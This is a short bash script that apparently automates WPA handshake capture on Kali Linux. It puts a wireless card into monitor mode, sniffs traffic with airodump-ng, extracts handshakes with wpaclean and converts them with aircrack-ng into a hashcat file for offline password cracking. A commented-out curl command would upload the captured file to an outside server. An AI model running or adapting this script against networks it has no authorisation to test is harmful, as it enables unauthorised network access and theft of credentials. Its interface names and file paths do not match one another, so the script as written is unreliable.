#!/bin/bash


main(){
	airmon-ng check kill
	airmon-ng start wlan1mon

	echo "Start airodump.."
	timeout 5 airodump-ng -w /home/kali/shakes wlan0mon < /dev/null > /dev/null   
	
	echo "Clean cap file.."
	output=`wpaclean cleanshakes.cap shakes-01.cap > /dev/null`
	if [[ "$output" == *"net"* ]]; then
		echo "Handshakes detected!!!"
		aircrack-ng -j cat cleanshakes.cap > /dev/null
	else
		echo "No handshakes"
	fi
	
  	#curl -i -X POST -H "imei: asdfa" -H "date: 112321312" -H "Content-Type: multipart/form-data" -F "myFile=@/home/kali/cat.hccapx" http://192.168.1.34:9000/upload
}


main 
